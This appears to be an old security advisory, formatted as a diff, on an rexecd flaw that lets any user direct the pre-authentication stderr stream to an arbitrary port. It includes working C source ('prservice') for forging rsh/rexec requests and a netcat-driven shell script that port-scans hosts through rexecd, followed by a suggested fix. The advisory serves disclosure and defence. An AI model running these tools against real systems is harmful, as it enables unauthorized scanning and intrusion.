@@ -1,0 +1,161 @@
+
+Vulnerability:
+        Rexecd allows redirection of stderr stream to an arbitrary port on
+the client machine.  This stream is opened by rexecd before authentication of
+the user.
+
+Vulnerable:
+        All systems with BSD-based networking including FreeBSD,
+OpenBSD, NetBSD, BSDI BSD/OS, Solaris 2, OSF/1, Ultrix, Linux.
+
+Background:
+        Rshd and rexecd can output stderr by opening a socket from the
+server machine to the client machine which is accepted by the rsh or rexec
+client.  The rsh client opens the initial connection from a privileged port,
+rshd responds from a privileged port, and redirects the connection to a
+privleged port on the client machine.  The trust model is preserved because
+this whole process is controlled by the setuid program rsh on the client
+machine.
+        Exec is fundamentally similar to the shell service except that instead
+of a remote and local username being transmitted (for .rhosts and hosts.equiv
+authentication only) a username and password is transmitted, and the whole
+exchange uses unprivileged ports.
+
+Discussion:
+        Because rexec uses unprivileged ports for the whole process, any
+user can send a request to a rexecd requesting connection of the stderr stream
+to an arbitrary port on the client machine.  Since the client is unprivileged,
+there is no possibility for the legitimate stderr stream to be destined for a
+privileged port.
+        In addition, spoofing techniques could allow the client to direct
+the stderr stream towards an arbitrary host as well as an arbitrary port,
+possibly exploiting a given trust model.
+        Since rexecd terminates if the stderr port can't be connected to,
+and the port can be specified, rexecd can be used to easily scan the client
+host from the server host.  The included script "rexecscan" demonstrates
+this.
+
+Repeat-By:
+
+begin prservice.c
+
+/* modified by jaeger 12Nov1996. Duplicated slack coding style.
+
+   now takes
+        port locuser remuser [cmd]
+        port remuser passwd [cmd]
+   where port is the dst port you wish the stderr socket to connect to
+   from the server to the client machine.
+
+/* generate ^@string1^@string2^@cmd^@ input to netcat, for scripting up
+   rsh/rexec attacks.  Needs to be a prog because shells strip out nulls.
+
+   args:
+        locuser remuser [cmd]
+        remuser passwd [cmd]
+
+   cmd defaults to "pwd".
+
+   ... whatever.  _H*/
+
+#include <stdio.h>
+
+/* change if you like; "id" is a good one for figuring out if you won too */
+static char cmd[] = "pwd";
+
+static char buf [256];
+
+main(argc, argv)
+  int argc;
+  char * argv[];
+{
+  register int x;
+  register int y = 0;
+  char * p;
+  char * q;
+
+  p = buf;
+  memset (buf, 0, 256);
+
+  if (! argv[1])
+    goto wrong;
+  x = strlen (argv[1]);
+  memcpy (p, argv[1], x);       /* port plus null */
+  x++;
+  p += x;
+  y += x;
+
+  if (! argv[2])
+    goto wrong;
+  x = strlen (argv[2]);
+  memcpy (p, argv[2], x);       /* second arg plus null */
+  x++;
+  p += x;
+  y += x;
+
+  if (! argv[3])
+    goto wrong;
+  x = strlen (argv[3]);
+  memcpy (p, argv[3], x);       /* third arg plus null */
+  x++;
+  p += x;
+  y += x;
+
+  q = cmd;
+  if (argv[4])
+    q = argv[4];
+  x = strlen (q);               /* not checked -- bfd */
+  memcpy (p, q, x);             /* the command, plus final null */
+  x++;
+  p += x;
+  y += x;
+
+  memcpy (p, "\n", 1);          /* and a newline, so it goes */
+  y++;
+
+  write (1, buf, y);            /* zot! */
+  exit (0);
+
+wrong:
+  fprintf (stderr, "%s: <port> <arg> <arg>\n",argv[0]);
+  exit (1);
+}
+
+end prservice.c
+
+begin rexecscan
+
+#!/bin/sh
+# Dumb script to demonstrate scanning with rexecd
+# jaeger, 12Nov1996
+
+# Path to netcat
+NC=nc
+# Path to prservice program
+PRS=./prservice
+# Port to scan to
+MAX=1024
+
+TARGET=$1
+USER=$2
+PASSWORD=$3
+
+PORT=1
+
+if [ $# -ne 3 ]; then
+        echo "$0 <targethost> <username> <password>"
+fi
+
+while [ $PORT -lt $MAX ]; do
+        $PRS $PORT $USER $PASSWORD "echo $PORT open" | $NC $TARGET 512
+        PORT=`expr $PORT + 1`
+done
+
+exit 0
+
+end rexecscan
+
+Suggested Fix:
+        The rexecd should check the specified return port ("port") to make
+sure it is nonprivileged, and not open the stderr stream until authentication
+is complete.  Similar fixes for rshd are left as an exercise for the reader.
